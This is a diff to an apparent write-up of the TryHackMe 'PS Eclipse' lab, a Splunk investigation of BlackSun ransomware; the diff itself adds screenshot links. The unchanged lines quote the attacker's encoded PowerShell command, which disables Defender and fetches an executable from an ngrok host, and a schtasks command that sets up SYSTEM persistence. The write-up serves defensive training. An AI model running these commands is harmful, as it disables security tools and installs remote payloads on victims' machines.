@@ -22,6 +22,13 @@ https://tryhackme.com/room/posheclipse
 * `index=* User="DESKTOP-TBV8NEF\\keegan"` 
 * `index=* User="DESKTOP-TBV8NEF\\keegan" TargetFilename="C:\\Windows\\Temp\\OUTSTANDING_GUTTER.exe"`
 
+### Relevant Photos
+* [Search.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/01_Question_One_Search.png)
+* [TargetFileName.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/02_Question_One_TargetFileName.png)
+* [Binary.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/03_Question_One_Binary.png)
+* [PID.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/04_Question_One_PID.png)
+* [Technique.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/05_Question_One_Technique.png)
+
 ---
 
 ## Download Source & URL
@@ -37,6 +44,12 @@ https://tryhackme.com/room/posheclipse
 * `index=* User="index=* User="DESKTOP-TBV8NEF\\keegan" CommandLine="powershell.exe  -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA"`
 * Decoded Command: `Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;...`
 
+### Relevant Photos
+* [CommandLine.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/06_Question_Two_CommandLine.png)
+* [ShowSource.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/07_Question_Two_ShowSource.png)
+* [CyberChef.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/08_Question_Two_CyberChef.png)
+* [CyberChef_Defang.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/09_Question_Two_CyberChef_Defang.png)
+
 ---
 
 ## Download Execution Tool
@@ -49,6 +62,9 @@ https://tryhackme.com/room/posheclipse
 ### Commands & Search Queries
 * `index=* User="DESKTOP-TBV8NEF\\keegan" process_name="powershell.exe"`
 * I also reviewed the process hierarchy in the "show source" view of the initial detection to verify the full path.
+
+### Relevant Photos
+* [Binary_Path.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/10_Question_Three_Binary_Path.png)
 
 ---
 
@@ -63,6 +79,9 @@ https://tryhackme.com/room/posheclipse
 ### Commands & Search Queries
 * `schtasks /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\\Windows\\Temp\\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f`
 
+### Relevant Photos
+* [PE.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/11_Question_Four_PE.png)
+
 ---
 
 ## Permissions & Elevated Command
@@ -75,6 +94,9 @@ https://tryhackme.com/room/posheclipse
 ### Commands & Search Queries
 * I extracted the full command and user context from the decoded PowerShell script:
 * Answer: `NT AUTHORITY\"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe`
+
+### Relevant Photos
+* [Command.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/12_Question_Five_Command.png)
 
 ---
 
@@ -91,6 +113,10 @@ https://tryhackme.com/room/posheclipse
 * I reviewed the `QueryName` field within the results to find the active C2 domain.
 * Answer: `hxxp[://]9030-181-215-214-32[.]ngrok[.]io`
 
+### Relevant Photos
+* [Server.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/13_Question_Six_Server.png)
+* [Server_Defang.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/14_Question_Six_Server_Defang.png)
+
 ---
 
 ## Secondary PowerShell Script
@@ -104,6 +130,9 @@ https://tryhackme.com/room/posheclipse
 * `index=* "temp" | stats count by TargetFilename`
 * I narrowed the time range to the specific window of the incident to ensure high-fidelity results.
 * Answer: `script.ps1`
+
+### Relevant Photos
+* [PS_Script.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/15_Question_Seven_PS_Script.png)
 
 ---
 
@@ -121,6 +150,11 @@ https://tryhackme.com/room/posheclipse
 * I identified the hash from the event details and performed a lookup on VirusTotal.
 * Answer: `BlackSun.ps1`
 
+### Relevant Photos
+* [BlackSun_TargetFilename.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/16_Question_Eight_BlackSun_TargetFilename.png)
+* [Hash.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/17_Question_Eight_Hash.png)
+* [VirusTotal.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/18_Question_Eight_VirusTotal.png)
+
 ---
 
 ## Ransomware Note Discovery
@@ -135,6 +169,9 @@ https://tryhackme.com/room/posheclipse
 * I analyzed the `TargetFilename` field to distinguish between the wallpaper artifact and the text-based ransom note.
 * Answer: `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`
 
+### Relevant Photos
+* [Ransom_Note.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/19_Question_Nine_Ransom_Note.png)
+
 ---
 
 ## Wallpaper Persistence & IOCs
@@ -148,3 +185,6 @@ https://tryhackme.com/room/posheclipse
 * `index=* "BlackSun"`
 * Found `TargetFilename: C:\Users\Public\Pictures\blacksun.jpg`
 * Answer: `C:\Users\Public\Pictures\blacksun.jpg`
+
+### Relevant Photos
+* [Ransom_JPG.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/20_Question_Ten_Ransom_JPG.png)
